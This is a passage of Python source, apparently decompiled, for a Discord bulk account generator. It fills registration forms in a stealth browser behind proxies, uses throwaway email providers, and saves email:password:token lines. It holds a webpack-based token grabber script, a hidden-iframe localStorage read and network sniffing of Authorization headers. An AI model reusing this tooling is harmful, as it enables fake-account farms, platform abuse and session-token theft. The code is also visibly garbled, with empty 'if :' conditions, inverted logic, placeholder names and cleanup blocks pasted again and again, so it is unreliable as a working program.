USA_LAST_NAMES = ['Moon','Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis','Rodriguez','Martinez','Hernandez','Lopez','Gonzalez','Wilson','Anderson','Thomas','Taylor','Moore','Jackson','Martin','Lee','Perez','Thompson','White','Harris','Clark','Lewis','Walker','Hall','Allen','Young','King','Wright','Scott','Green','Baker','Adams','Nelson','Hill','Ramirez','Campbell','Mitchell','Roberts','Carter','Phillips','Evans','Turner','Torres','Parker','Collins','Edwards','Stewart','Flores','Morris','Nguyen','Murphy','Rivera','Cook','Rogers','Morgan','Peterson','Cooper','Reed','Bailey','Bell','Gomez','Kelly','Howard','Ward','Cox','Diaz','Richardson','Wood','Watson','Brooks','Bennett','Gray','James','Reyes','Cruz','Hughes','Price','Myers','Long','Foster','Sanders','Ross','Powell','Sullivan','Russell','Ortiz','Jenkins','Gutierrez','Perry','Butler','Barnes','Fisher','Henderson','Coleman','Simmons','Patterson','Jordan']
def generate_usa_name() -> tuple:
  first = random.choice(USA_FIRST_NAMES)
  last = random.choice(USA_LAST_NAMES)
  return (first,last)

def generate_display_name() -> str:
  first,last = generate_usa_name()
  if 'Moon' not in (first,last) and random.random() < 0.3:
    if random.random() < 0.5:
      first = 'Moon'
    else:
      last = 'Moon'

  return f'''{first} {last}'''

def generate_username() -> str:
  first,last = generate_usa_name()
  if 'Moon' not in (first,last) and random.random() < 0.3:
    last = 'Moon'

  sep = random.choice(['','','_','.'])
  base = f'''{first}{sep}{last}'''
  return f'''{base}{random.randint(100000,99999999)}'''.lower()

def generate_password(length: int = 16) -> str:
  chars = string.ascii_letters+string.digits+'!@#$%^&*'
  password = ''.join(random.choices(chars,k=length))
  if any((c.isupper() for c in password)):
    password = password[:1].upper()+password[1:]

  if any((c.isdigit() for c in password)):
    password = password[:-1]+str(random.randint(0,9))

  return password

def check_token(token: str,proxy_config: Dict = None) -> str:
  try:
    session = tls_client.Session(client_identifier='chrome_138',random_tls_extension_order=True)
    if proxy_config:
      proxy_dict = get_session_proxy(proxy_config)
      if proxy_dict:
        session.proxies = proxy_dict

    headers = {'Authorization':token,'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'}
    response = session.get('https://discordapp.com/api/v9/users/@me/library',headers=headers)
    if response.status_code == 200:
      return 'VALID'
    else:
      if response.status_code == 403:
        return 'LOCKED'
      else:
        if response.status_code == 401:
          return 'INVALID'
        else:
          if response.status_code == 429:
            return 'ERROR'
          else:
            return 'INVALID'

  except Exception as e:
    log.debug(f'''Token check error: {e}''')
    return 'ERROR'

def save_account_to_file(email: str,password: str,token: str,status: str):
  global SESSION_UNVERIFIED
  global SESSION_VALID
  global SESSION_LOCKED
  global SESSION_INVALID
  try:
    verified,_ = check_email_verified_api(token)
    if verified:
      output_file = OUTPUT_DIR/'unverified.txt'
      with LOCK:
        SESSION_UNVERIFIED += 1

      match __CHAOS_PY_NULL_PTR_VALUE_ERR__:
        case 'VALID':
          output_file = OUTPUT_DIR/'valid.txt'
          with LOCK:
            SESSION_VALID += 1

          play_alert_sound()
          if config.get('notifications',{}).get('on_valid',True):
            mask_em = log.mask_email(email)
            mask_tok = log.mask_token(token)
            send_discord_webhook(title='Valid Account Created!',description='A new verified token was successfully generated and saved.',fields=[{'name':'Email','value':f'''`{mask_em}`''','inline':True},{'name':'Token','value':f'''`{mask_tok}`''','inline':True},{'name':'Total Valid','value':str(SESSION_VALID),'inline':True},{'name':'File','value':'`output/valid.txt`','inline':True}],color=65382)

      output_file = OUTPUT_DIR/'locked.txt'
      with LOCK:
        SESSION_LOCKED += 1

  except Exception as e:
    log.error(f'''Failed to save account: {e}''')
    return False

  output_file = OUTPUT_DIR/'invalid.txt'
  with LOCK:
    SESSION_INVALID += 1

  with LOCK:
    with open(output_file,'a',encoding='utf-8') as f:
      f.write(f'''{email}:{password}:{token}\n''')

  log.success(f'''Saved → {output_file.name}''')
  return True

WASTED_MAILS_FILE = Path('wasted_mails.txt')
WASTED_LOCK = threading.Lock()
WASTED_PROVIDERS = ('zeus','hotmail007')
def save_wasted_mail(email: str,password: str,token: str,uuid: str,provider: str):
  if provider not in WASTED_PROVIDERS or email:
    return None
  else:
    line = f'''{email}:{(password or '')}:{(token or '')}:{(uuid or '')}'''
    try:
      with WASTED_LOCK:
        with open(WASTED_MAILS_FILE,'a',encoding='utf-8') as f:
          f.write(line+'\n')

    except Exception as e:
      log.error(f'''Failed to save wasted mail: {e}''')
      return None

    log.warning(f'''Wasted mail saved → {WASTED_MAILS_FILE.name}''')
    return None

def pop_wasted_mail() -> Optional[tuple]:
  try:
    with WASTED_LOCK:
      if WASTED_MAILS_FILE.exists():
        try:
          None.__CHAOS_PY_NULL_PTR_VALUE_ERR__(None,None)
          return None
        except:
          pass

  except Exception as e:
    log.error(f'''Failed to read wasted mail: {e}''')
    return None

  lines = [l for l in WASTED_MAILS_FILE.read_text(encoding='utf-8').splitlines() if l.strip()]
  if lines:
    try:
      return None
    except:
      pass

  else:
    first = lines.pop(0)
    WASTED_MAILS_FILE.write_text('\n'.join(lines)+'\n' if lines else '',encoding='utf-8')
    parts = first.split(':')
    email = parts[0] if len(parts) > 0 else ''
    password = parts[1] if len(parts) > 1 else ''
    token = parts[2] if len(parts) > 2 else ''
    uuid = parts[3] if len(parts) > 3 else ''
    return (email,password,token,uuid)

def check_email_verified_api(token: str,proxy_config: Dict = None):
  try:
    session = tls_client.Session(client_identifier='chrome_138',random_tls_extension_order=True)
    if proxy_config:
      proxy_dict = get_session_proxy(proxy_config)
      if proxy_dict:
        session.proxies = proxy_dict

    headers = {'Authorization':token,'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    response = session.get('https://discord.com/api/v9/users/@me',headers=headers)
    if response.status_code == 200:
      data = response.json()
      verified = data.get('verified',False)
      email = data.get('email','N/A')
      return (verified,email)
    else:
      return (None,None)

  except:
    return (None,None)

async def human_type(element,text: str):
  for char in text:
    await element.send_keys(char)
    await asyncio.sleep(random.uniform(0.005,0.02))

async def clear_and_type(page,selector: str,value: str,timeout: int = 45):
  try:
    element = None
    for _ in range(5):
      try:
        element = await page.select(selector,timeout=timeout//5)
        if element:
          break

        continue
      except Exception:
        await asyncio.sleep(2)

  except Exception as e:
    raise e

  if element:
    raise Exception(f'''Element not found: {selector}''')

  selector_js = json.dumps(selector)
  await page.evaluate(f'''() => {{\n                const el = document.querySelector({selector_js});
                if (!el) return;
                el.focus();
                el.value = "";
                el.dispatchEvent(new Event("input", {{ bubbles: true }}));
                el.dispatchEvent(new Event("change", {{ bubbles: true }}));
            }}''')
  await asyncio.sleep(random.uniform(0.01,0.04))
  await human_type(element,value)

async def fill_registration_form(page,email: str,display_name: str,username: str,password: str,config: dict = None) -> bool:
  try:
    log.info('Filling form...')
  except Exception as e:
    log.error(f'''Form fill error: {e}''')
    return False

  try:
    await clear_and_type(page,'input[name="email"]',email,timeout=45)
    await asyncio.sleep(random.uniform(0.05,0.15))
  except Exception:
    return False

  try:
    await clear_and_type(page,'input[name="global_name"]',display_name,timeout=20)
    await asyncio.sleep(random.uniform(0.05,0.15))
  except Exception:
    return False

  try:
    await clear_and_type(page,'input[name="username"]',username,timeout=20)
    await asyncio.sleep(random.uniform(0.05,0.15))
  except Exception:
    return False

  try:
    await clear_and_type(page,'input[name="password"]',password,timeout=20)
    await asyncio.sleep(random.uniform(0.05,0.15))
  except Exception:
    return False

  await asyncio.sleep(0.1)
  await fill_date_of_birth(page)
  await asyncio.sleep(0.05)
  try:
    await page.evaluate(JS_UTILS)
    await asyncio.sleep(0.05)
    await page.evaluate('window.utils.clickAllCheckboxes()')
    await asyncio.sleep(0.05)
  except Exception:
    pass

  clicked = False
  await asyncio.sleep(0.1)
  try:
    buttons = await page.select_all('button')
    for button in buttons:
      try:
        text = (await button.get('textContent') or getattr(button,'text','') or '')
        text = str(text).strip()
        if text and any((keyword in text for keyword in ('Continue','Create','Submit','Register'))):
          await button.click()
          clicked = True
          break

        continue
      except Exception:
        pass

  except Exception:
    pass

  if clicked:
    try:
      submit = await page.select('[type="submit"]',timeout=0)
      if submit:
        await submit.click()
        clicked = True

    except Exception:
      pass

  if clicked:
    try:
      clicked_eval = await page.evaluate('''() => { 
                    const buttons = document.querySelectorAll(\'button\'); 
                    for (const btn of buttons) { 
                        const text = btn.textContent || \'\'; 
                        if (text.includes(\'Continue\') || text.includes(\'Create\') || text.includes(\'Submit\')) { 
                            btn.click(); 
                            return true; 
                        } 
                    } 
                    return false; 
                }''')
      if clicked_eval:
        clicked = True

    except Exception:
      pass

  if clicked:
    log.error('Could not find submit button')
    return False
  else:
    log.success('Form submitted!')
    return True

async def fill_date_of_birth(page):
  import truedriver.cdp.input_ as cdp_input
  try:
    month_el = await page.select('[aria-label*="Month"], [aria-label*="Mês"]',timeout=5)
    if month_el:
      await month_el.click()
      await asyncio.sleep(0.05)
      month_scrolls = random.randint(1,11)
      for _ in range(month_scrolls):
        await page.send(cdp_input.dispatch_key_event(type_='keyDown',key='ArrowDown',windows_virtual_key_code=40,native_virtual_key_code=40))
        await page.send(cdp_input.dispatch_key_event(type_='keyUp',key='ArrowDown',windows_virtual_key_code=40,native_virtual_key_code=40))
        await asyncio.sleep(0.005)

      await asyncio.sleep(0.05)
      await page.send(cdp_input.dispatch_key_event(type_='keyDown',key='Enter',windows_virtual_key_code=13,native_virtual_key_code=13))
      await page.send(cdp_input.dispatch_key_event(type_='keyUp',key='Enter',windows_virtual_key_code=13,native_virtual_key_code=13))
      await asyncio.sleep(0.05)

    day_el = await page.select('[aria-label*="Day"], [aria-label*="Dia"]',timeout=5)
    if day_el:
      await day_el.click()
      await asyncio.sleep(0.05)
      day_scrolls = random.randint(1,28)
      for _ in range(day_scrolls):
        await page.send(cdp_input.dispatch_key_event(type_='keyDown',key='ArrowDown',windows_virtual_key_code=40,native_virtual_key_code=40))
        await page.send(cdp_input.dispatch_key_event(type_='keyUp',key='ArrowDown',windows_virtual_key_code=40,native_virtual_key_code=40))
        await asyncio.sleep(0.005)

      await asyncio.sleep(0.05)
      await page.send(cdp_input.dispatch_key_event(type_='keyDown',key='Enter',windows_virtual_key_code=13,native_virtual_key_code=13))
      await page.send(cdp_input.dispatch_key_event(type_='keyUp',key='Enter',windows_virtual_key_code=13,native_virtual_key_code=13))
      await asyncio.sleep(0.05)

    year_el = await page.select('[aria-label*="Year"], [aria-label*="Ano"]',timeout=5)
    if year_el:
      await year_el.click()
      await asyncio.sleep(0.05)
      year_scrolls = random.randint(25,35)
      for _ in range(year_scrolls):
        await page.send(cdp_input.dispatch_key_event(type_='keyDown',key='ArrowDown',windows_virtual_key_code=40,native_virtual_key_code=40))
        await page.send(cdp_input.dispatch_key_event(type_='keyUp',key='ArrowDown',windows_virtual_key_code=40,native_virtual_key_code=40))
        await asyncio.sleep(0.005)

      await asyncio.sleep(0.05)
      await page.send(cdp_input.dispatch_key_event(type_='keyDown',key='Enter',windows_virtual_key_code=13,native_virtual_key_code=13))
      await page.send(cdp_input.dispatch_key_event(type_='keyUp',key='Enter',windows_virtual_key_code=13,native_virtual_key_code=13))
      await asyncio.sleep(0.05)
      return None
    else:
      return None

  except Exception as e:
    log.debug(f'''DOB error: {e}''')
    return None

async def wait_for_account_creation(page,timeout: int = 300) -> bool:
  deadline = time.time()+timeout
  last_url = ''
  captcha_active = False
  captcha_logged = False
  CAPTCHA_EXTEND = 60
  while time.time() < deadline:
    await asyncio.sleep(0.5)
    pass
    try:
      current_url = await page.evaluate('window.location.href')
      current_url = current_url if hasattr(current_url,'value') else __CHAOS_PY_NULL_PTR_VALUE_ERR__ if current_url[0] else __CHAOS_PY_NULL_PTR_VALUE_ERR__ if isinstance(current_url,tuple) else str(current_url[0])
      current_url = str(current_url) if current_url else ''
    except Exception:
      pass

    if current_url and current_url != last_url:
      pass

    if current_url and 'discord.com' in current_url and (s in current_url for s in skip):
      f'''Account created! Redirected to: {current_url}'''
      return True
    else:
      try:
        if has_captcha:
          if captcha_logged:
            f'''Captcha detected — waiting for {solver_label} to solve...'''

          if new_deadline > deadline:
            pass

        else:
          if captcha_active:
            'Captcha cleared — waiting for redirect...'

      except Exception:
        pass

      f'''URL check error: {e}'''
      del(e)
      del(e)
      'Timeout waiting for account creation'
      return False

async def _get_page_errors(page) -> str:
  try:
    return await page.evaluate('''() => {
            const sel = [
                \'[class*="error"]\', \'[class*="invalid"]\',
                \'[class*="Error"]\', \'[role="alert"]\',
                \'[class*="message"]\'
            ];
            const texts = [];
            for (const s of sel) {
                for (const el of document.querySelectorAll(s)) {
                    const t = el.textContent.trim();
                    if (t && t.length < 120) texts.push(t);
                }
            }
            return [...new Set(texts)].join(\' | \');
        }''')
  except:
    return ''

async def _extract_token_from_browser(page,timeout: float = 8) -> Optional[str]:
  script = '''
        (() => {
            const clean = (t) => (typeof t === \'string\') ? t.replace(/^"|"$/g, \'\') : t;

            // ── Method 1: webpack token grabber ──────────────────────────────
            // Discord removed the token from localStorage and freezes the
            // localStorage accessor, so getItem(\'token\') returns null. The
            // token still lives in the running app\'s webpack modules — pull it
            // straight from the auth/token store.
            try {
                let token;
                window.webpackChunkdiscord_app = window.webpackChunkdiscord_app || [];
                window.webpackChunkdiscord_app.push([
                    [Math.random()],
                    {},
                    (req) => {
                        for (const m of Object.keys(req.c).map(k => req.c[k].exports)) {
                            if (!m) continue;
                            // getToken() on the default export
                            if (m.default && typeof m.default.getToken === \'function\') {
                                const t = m.default.getToken();
                                if (t) { token = t; return; }
                            }
                            // getToken() on the module itself
                            if (typeof m.getToken === \'function\') {
                                const t = m.getToken();
                                if (t) { token = t; return; }
                            }
                        }
                    },
                ]);
                if (token) return clean(token);
            } catch (e) {}

            // ── Method 2: plain localStorage (older builds) ──────────────────
            try {
                const direct = localStorage.getItem(\'token\');
                if (direct) return clean(direct);
            } catch (e) {}

            // ── Method 3: hidden-iframe localStorage (accessor not frozen) ───
            try {
                const i = document.createElement(\'iframe\');
                document.body.appendChild(i);
                const t = i.contentWindow.localStorage.getItem(\'token\');
                i.remove();
                if (t) return clean(t);
            } catch (e) {}

            return null;
        })()
    '''
  start = time.time()
  while time.time()-start < timeout:
    try:
      result = await page.evaluate(script)
      if hasattr(result,'value'):
        result = result.value

      if isinstance(result,str) and len(result) > 30:
        return result
      else:
        await asyncio.sleep(0.5)
        return None

    except Exception as e:
      log.debug(f'''localStorage token read error: {e}''')

async def _sniff_token_from_network(page,timeout: float = 15) -> Optional[str]:
  captured = {}
  def _on_request(event):
    try:
      req = event.request
      url = (getattr(req,'url','') or '')
      if :
        pass

      headers = {}
      if '/api/' not in url:
        return None
      else:
        for k,v in headers.items():
          if k.lower() == 'authorization' and v and str(v).lower().startswith('bearer'):
            captured['token'] = str(v)

        return None

    except Exception:
      return None

  try:
    page.add_handler(cdp.network.RequestWillBeSent,_on_request)
    await page.send(cdp.network.enable())
  except Exception as e:
    log.debug(f'''CDP network enable failed: {e}''')
    return None

  try:
    await page.reload()
  except Exception:
    try:
      await page.get('https://discord.com/channels/@me')
    except Exception:
      pass

  except:
    pass
  except:
    pass

  start = time.time()
  while time.time()-start < timeout:
    if captured.get('token'):
      tok = captured['token'].replace('"','').strip()
      try:
        await page.send(cdp.network.disable())
      except Exception:
        pass

      return tok
    else:
      await asyncio.sleep(0.3)
      try:
        await page.send(cdp.network.disable())
      except Exception:
        pass

      return None

async def wait_for_discord_token(page,timeout: int = 30,email: str = None,password: str = None,proxy_config: Dict = None):
  if email or password:
    log.error('Email and password required for API token fetch')
    return None
  else:
    await asyncio.sleep(3)
    log.info('Fetching token via API login...')
    for attempt in range(5):
      try:
        token = await fetch_discord_token(email,password,proxy_config)
        if token:
          log.success(f'''Token via API login (attempt {attempt+1})''')
          token
          return
        else:
          log.warning(f'''API returned empty token (attempt {attempt+1}/5)''')
          await asyncio.sleep(3)
          continue
          log.error('Could not obtain token via API')
          return None

      except Exception as e:
        log.debug(f'''API login error: {e}''')

async def safe_browser_get(browser,url: str,max_retries: int = 3):
  for attempt in range(max_retries):
    try:
      page = await browser.get(url)
    except (StopIteration,RuntimeError) as e:
      if attempt < max_retries-1:
        log.warning(f'''Browser navigation failed (attempt {attempt+1}/{max_retries}), retrying...''')
        await asyncio.sleep(2)
      else:
        log.error(f'''Failed to navigate to {url} after {max_retries} attempts''')
        raise

    page
    return

async def worker(worker_id: int,proxy_config: Dict = None,slot: int = 1,total: int = 1):
  global ACTIVE_WORKERS
  global SESSION_CREATED
  global SESSION_STOP
  if SESSION_STOP:
    return None
  else:
    with WORKER_LOCK:
      ACTIVE_WORKERS += 1
      current_active = ACTIVE_WORKERS

    browser = None
    temp_profile = None
    account_created = False
    wasted_info = None
    try:
      log.info('Starting account creation...')
      if proxy_config:
        masked_proxy = proxy_config.get('masked_url',proxy_config.get('full_url','Unknown'))
        log.info(f'''Using proxy (browser only): {masked_proxy}''')

      username = generate_username()
      display_name = generate_display_name()
      email_from_api,email_password,email_token,email_uuid,email_provider = get_email_from_provider(config)
      if email_from_api:
        email = email_from_api
        password = email_password
        wasted_info = (email,email_password,email_token,email_uuid,email_provider)
        log.success(f'''Fetched: {email}''')
      else:
        log.error('Failed to get email')
        pass
        if account_created and wasted_info:
          save_wasted_mail(*wasted_info)

        if browser:
          try:
            await browser.stop()
          except Exception:
            pass

          await asyncio.sleep(0.2)

        _profile_to_delete = temp_profile
        _cache_to_delete = BROWSER_CACHE_DIR/Path(temp_profile).name if temp_profile else None
        def _background_cleanup():
          if _profile_to_delete and os.path.exists(_profile_to_delete):
            if PSUTIL_AVAILABLE:
              try:
                norm_profile = os.path.normpath(_profile_to_delete).lower()
                for proc in psutil.process_iter(['pid','name','cmdline']):
                  try:
                    if :
                      pass

                    cmdline = []
                    cmd_str = ' '.join(cmdline).lower()
                    if norm_profile in cmd_str:
                      proc.kill()
                      proc.wait(timeout=3)

                    continue
                  except (psutil.NoSuchProcess,psutil.AccessDenied,psutil.TimeoutExpired):
                    pass

              except Exception:
                pass

              time.sleep(0.5)

            def _on_exc(func,fpath,exc):
              try:
                os.chmod(fpath,511)
                func(fpath)
                return None
              except Exception:
                return None

            def _force_rmtree(path):
              shutil.rmtree(path,onexc=_on_exc)

            for _attempt in range(15):
              try:
                _force_rmtree(_profile_to_delete)
              except Exception:
                time.sleep(2)

              break
            else:
              shutil.rmtree(_profile_to_delete,ignore_errors=True)

          if :
            try:
              shutil.rmtree(_cache_to_delete,ignore_errors=True)
              return None
            except Exception:
              return None

            return None
          else:
            return None

        threading.Thread(target=_background_cleanup,daemon=True).start()
        with WORKER_LOCK:
          ACTIVE_WORKERS -= 1

        return None
        return None

    except Exception as e:
      log.error(f'''Worker error: {e}''')

    temp_profile = tempfile.mkdtemp()
    worker_cache_dir = BROWSER_CACHE_DIR/Path(temp_profile).name
    worker_cache_dir.mkdir(parents=True,exist_ok=True)
    browser = await launch_browser(proxy_config=proxy_config,slot=slot,total=total,temp_profile=temp_profile,worker_cache_dir=str(worker_cache_dir))
    page = await browser.get('https://discord.com/register')
    if page is None:
      log.error('Could not get browser page')
      pass
      if account_created and wasted_info:
        save_wasted_mail(*wasted_info)

      if browser:
        try:
          await browser.stop()
        except Exception:
          pass

        await asyncio.sleep(0.2)

      _profile_to_delete = temp_profile
      _cache_to_delete = BROWSER_CACHE_DIR/Path(temp_profile).name if temp_profile else None
      def _background_cleanup():
        if _profile_to_delete and os.path.exists(_profile_to_delete):
          if PSUTIL_AVAILABLE:
            try:
              norm_profile = os.path.normpath(_profile_to_delete).lower()
              for proc in psutil.process_iter(['pid','name','cmdline']):
                try:
                  if :
                    pass

                  cmdline = []
                  cmd_str = ' '.join(cmdline).lower()
                  if norm_profile in cmd_str:
                    proc.kill()
                    proc.wait(timeout=3)

                  continue
                except (psutil.NoSuchProcess,psutil.AccessDenied,psutil.TimeoutExpired):
                  pass

            except Exception:
              pass

            time.sleep(0.5)

          def _on_exc(func,fpath,exc):
            try:
              os.chmod(fpath,511)
              func(fpath)
              return None
            except Exception:
              return None

          def _force_rmtree(path):
            shutil.rmtree(path,onexc=_on_exc)

          for _attempt in range(15):
            try:
              _force_rmtree(_profile_to_delete)
            except Exception:
              time.sleep(2)

            break
          else:
            shutil.rmtree(_profile_to_delete,ignore_errors=True)

        if :
          try:
            shutil.rmtree(_cache_to_delete,ignore_errors=True)
            return None
          except Exception:
            return None

          return None
        else:
          return None

      threading.Thread(target=_background_cleanup,daemon=True).start()
      with WORKER_LOCK:
        ACTIVE_WORKERS -= 1

      return None
      return None
    else:
      try:
        await page.wait_for_ready_state('complete',timeout=30000)
      except Exception:
        pass

      try:
        await page.evaluate(JS_UTILS)
      except Exception:
        pass

      log.info('Register page loaded')
      await asyncio.sleep(0.5)
      success = await fill_registration_form(page,email,display_name,username,password,config=config)
      if success:
        log.error('Form fill failed')
        pass
        if account_created and wasted_info:
          save_wasted_mail(*wasted_info)

        if browser:
          try:
            await browser.stop()
          except Exception:
            pass

          await asyncio.sleep(0.2)

        _profile_to_delete = temp_profile
        _cache_to_delete = BROWSER_CACHE_DIR/Path(temp_profile).name if temp_profile else None
        def _background_cleanup():
          if _profile_to_delete and os.path.exists(_profile_to_delete):
            if PSUTIL_AVAILABLE:
              try:
                norm_profile = os.path.normpath(_profile_to_delete).lower()
                for proc in psutil.process_iter(['pid','name','cmdline']):
                  try:
                    if :
                      pass

                    cmdline = []
                    cmd_str = ' '.join(cmdline).lower()
                    if norm_profile in cmd_str:
                      proc.kill()
                      proc.wait(timeout=3)

                    continue
                  except (psutil.NoSuchProcess,psutil.AccessDenied,psutil.TimeoutExpired):
                    pass

              except Exception:
                pass

              time.sleep(0.5)

            def _on_exc(func,fpath,exc):
              try:
                os.chmod(fpath,511)
                func(fpath)
                return None
              except Exception:
                return None

            def _force_rmtree(path):
              shutil.rmtree(path,onexc=_on_exc)

            for _attempt in range(15):
              try:
                _force_rmtree(_profile_to_delete)
              except Exception:
                time.sleep(2)

              break
            else:
              shutil.rmtree(_profile_to_delete,ignore_errors=True)

          if :
            try:
              shutil.rmtree(_cache_to_delete,ignore_errors=True)
              return None
            except Exception:
              return None

            return None
          else:
            return None

        threading.Thread(target=_background_cleanup,daemon=True).start()
        with WORKER_LOCK:
          ACTIVE_WORKERS -= 1

        return None
        return None
      else:
        log.info('Form filled')
        log.info('Waiting for captcha solve...')
        created = await wait_for_account_creation(page)
        if created:
          log.error('Account creation failed - no redirect detected')
          pass
          if account_created and wasted_info:
            save_wasted_mail(*wasted_info)

          if browser:
            try:
              await browser.stop()
            except Exception:
              pass

            await asyncio.sleep(0.2)

          _profile_to_delete = temp_profile
          _cache_to_delete = BROWSER_CACHE_DIR/Path(temp_profile).name if temp_profile else None
          def _background_cleanup():
            if _profile_to_delete and os.path.exists(_profile_to_delete):
              if PSUTIL_AVAILABLE:
                try:
                  norm_profile = os.path.normpath(_profile_to_delete).lower()
                  for proc in psutil.process_iter(['pid','name','cmdline']):
                    try:
                      if :
                        pass

                      cmdline = []
                      cmd_str = ' '.join(cmdline).lower()
                      if norm_profile in cmd_str:
                        proc.kill()
                        proc.wait(timeout=3)

                      continue
                    except (psutil.NoSuchProcess,psutil.AccessDenied,psutil.TimeoutExpired):
                      pass

                except Exception:
                  pass

                time.sleep(0.5)

              def _on_exc(func,fpath,exc):
                try:
                  os.chmod(fpath,511)
                  func(fpath)
                  return None
                except Exception:
                  return None

              def _force_rmtree(path):
                shutil.rmtree(path,onexc=_on_exc)

              for _attempt in range(15):
                try:
                  _force_rmtree(_profile_to_delete)
                except Exception:
                  time.sleep(2)

                break
              else:
                shutil.rmtree(_profile_to_delete,ignore_errors=True)

            if :
              try:
                shutil.rmtree(_cache_to_delete,ignore_errors=True)
                return None
              except Exception:
                return None

              return None
            else:
              return None

          threading.Thread(target=_background_cleanup,daemon=True).start()
          with WORKER_LOCK:
            ACTIVE_WORKERS -= 1

          return None
          return None
        else:
          log.info('Extracting token...')
          token = await wait_for_discord_token(page,email=email,password=password,proxy_config=proxy_config)
          if token:
            if token.startswith('"') and token.endswith('"'):
              token = token[1:-1]

            token_match = re.search('([a-zA-Z0-9_-]{20,})\\.([a-zA-Z0-9_-]{6})\\.([a-zA-Z0-9_-]{27,})',token)
            if token_match:
              token = f'''{token_match.group(1)}.{token_match.group(2)}.{token_match.group(3)}'''

            log.info(f'''Token: {log.mask_token(token)}''')
            try:
              verified,user_email = check_email_verified_api(token,None)
            except Exception as e:
              log.warning(f'''Email verify check failed: {e}''')
              verified,user_email = (None,None)

            try:
              if verified is not None:
                if verified:
                  log.success('Email verified!')
                else:
                  if email_provider == 'draxono':
                    verify_url = fetch_verification_url_draxono(email,proxy_config=None)
                    if verify_url:
                      await verify_email_with_url(browser,verify_url,token)

                  else:
                    if email_provider == 'duckmail':
                      verify_url = fetch_verification_url_duckmail(email,email_password)
                      if verify_url:
                        await verify_email_with_url(browser,verify_url,token)

                    else:
                      if email_provider == 'cowmail':
                        ok = await verify_email_cowmail(email,email_password,browser,token)
                        if ok:
                          log.success('Email verified!')

                      else:
                        if email_provider == 'crowmail':
                          ok = await verify_email_crowmail_provider(email,email_password,browser,token)
                          if ok:
                            log.success('Email verified!')

                        else:
                          if email_provider == 'hotmail007' and email_token:
                            email_data = {'email':email,'password':email_password,'token':email_token,'uuid':email_uuid}
                            verify_url = fetch_verification_url_hotmail007(email_data,proxy_config=None)
                            if verify_url:
                              await verify_email_with_url(browser,verify_url,token)

            except Exception as e:
              log.warning(f'''Email verification error (continuing): {e}''')

            try:
              result = check_token(token,None)
              log.info(f'''Token Status: {result}''')
            except Exception as e:
              log.warning(f'''Token check failed: {e}''')
              result = 'ERROR'

            try:
              save_account_to_file(email,password,token,result)
            except Exception as e:
              log.error(f'''Failed to save account: {e}''')

            account_created = True
            with LOCK:
              SESSION_CREATED += 1
              created_now = SESSION_CREATED

            t = f'''/{SESSION_TARGET}''' if SESSION_TARGET else '/∞'
            LeakXUI.set_title(f'''[{created_now}{t}] {SESSION_VALID} valid · {SESSION_LOCKED} locked · {SESSION_INVALID} fail''')
            log.success(f'''Account #{created_now} created''')
            try:
              proxy_str = (proxy_config.get('full_url') or proxy_config.get('url')) if proxy_config else None
              log.info(f'''Humanizing account #{created_now}...''')
              await asyncio.to_thread(_humanize_account,token,created_now,proxy_str)
            except Exception as e:
              log.error(f'''Humanizer error: {e}''')

            if SESSION_TARGET > 0 and created_now >= SESSION_TARGET:
              with LOCK:
                SESSION_STOP = True

              log.success(f'''Target reached! {created_now}/{SESSION_TARGET} accounts. Stopping...''')
              pass
              if account_created and wasted_info:
                save_wasted_mail(*wasted_info)

              if browser:
                try:
                  await browser.stop()
                except Exception:
                  pass

                await asyncio.sleep(0.2)

              _profile_to_delete = temp_profile
              _cache_to_delete = BROWSER_CACHE_DIR/Path(temp_profile).name if temp_profile else None
              def _background_cleanup():
                if _profile_to_delete and os.path.exists(_profile_to_delete):
                  if PSUTIL_AVAILABLE:
                    try:
                      norm_profile = os.path.normpath(_profile_to_delete).lower()
                      for proc in psutil.process_iter(['pid','name','cmdline']):
                        try:
                          if :
                            pass

                          cmdline = []
                          cmd_str = ' '.join(cmdline).lower()
                          if norm_profile in cmd_str:
                            proc.kill()
                            proc.wait(timeout=3)

                          continue
                        except (psutil.NoSuchProcess,psutil.AccessDenied,psutil.TimeoutExpired):
                          pass

                    except Exception:
                      pass

                    time.sleep(0.5)

                  def _on_exc(func,fpath,exc):
                    try:
                      os.chmod(fpath,511)
                      func(fpath)
                      return None
                    except Exception:
                      return None

                  def _force_rmtree(path):
                    shutil.rmtree(path,onexc=_on_exc)

                  for _attempt in range(15):
                    try:
                      _force_rmtree(_profile_to_delete)
                    except Exception:
                      time.sleep(2)

                    break
                  else:
                    shutil.rmtree(_profile_to_delete,ignore_errors=True)

                if :
                  try:
                    shutil.rmtree(_cache_to_delete,ignore_errors=True)
                    return None
                  except Exception:
                    return None

                  return None
                else:
                  return None

              threading.Thread(target=_background_cleanup,daemon=True).start()
              with WORKER_LOCK:
                ACTIVE_WORKERS -= 1

              return None
              return None

          else:
            log.warning('Could not extract token')

          if account_created and wasted_info:
            save_wasted_mail(*wasted_info)

          if browser:
            try:
              await browser.stop()
            except Exception:
              pass

            await asyncio.sleep(0.2)

          _profile_to_delete = temp_profile
          _cache_to_delete = BROWSER_CACHE_DIR/Path(temp_profile).name if temp_profile else None
          def _background_cleanup():
            if _profile_to_delete and os.path.exists(_profile_to_delete):
              if PSUTIL_AVAILABLE:
                try:
                  norm_profile = os.path.normpath(_profile_to_delete).lower()
                  for proc in psutil.process_iter(['pid','name','cmdline']):
                    try:
                      if :
                        pass

                      cmdline = []
                      cmd_str = ' '.join(cmdline).lower()
                      if norm_profile in cmd_str:
                        proc.kill()
                        proc.wait(timeout=3)

                      continue
                    except (psutil.NoSuchProcess,psutil.AccessDenied,psutil.TimeoutExpired):
                      pass

                except Exception:
                  pass

                time.sleep(0.5)

              def _on_exc(func,fpath,exc):
                try:
                  os.chmod(fpath,511)
                  func(fpath)
                  return None
                except Exception:
                  return None

              def _force_rmtree(path):
                shutil.rmtree(path,onexc=_on_exc)

              for _attempt in range(15):
                try:
                  _force_rmtree(_profile_to_delete)
                except Exception:
                  time.sleep(2)

                break
              else:
                shutil.rmtree(_profile_to_delete,ignore_errors=True)

            if :
              try:
                shutil.rmtree(_cache_to_delete,ignore_errors=True)
                return None
              except Exception:
                return None

              return None
            else:
              return None

          threading.Thread(target=_background_cleanup,daemon=True).start()
          with WORKER_LOCK:
            ACTIVE_WORKERS -= 1

          return None
          return None
          if account_created and wasted_info:
